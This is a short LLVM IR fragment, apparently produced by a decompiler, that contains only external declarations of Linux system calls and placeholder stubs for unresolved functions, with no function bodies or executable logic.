declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @getppid(i32) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @kill(i32, i32) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @prctl(i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @readlink(i8*, i8*, i32) local_unnamed_addr

declare i32 @setsid(i32) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32* @mmap(i32*, i32, i32, i32, i32, i32) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @fstat(i32, %stat*) local_unnamed_addr

declare i32 @getdents64(i32, %linux_dirent64*, i32) local_unnamed_addr

declare i32* @mremap(i32*, i32, i32, i32, ...) local_unnamed_addr

declare i32 @munmap(i32*, i32) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @times(%tms*) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_6() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_7() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_8() local_unnamed_addr

declare %tms* @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
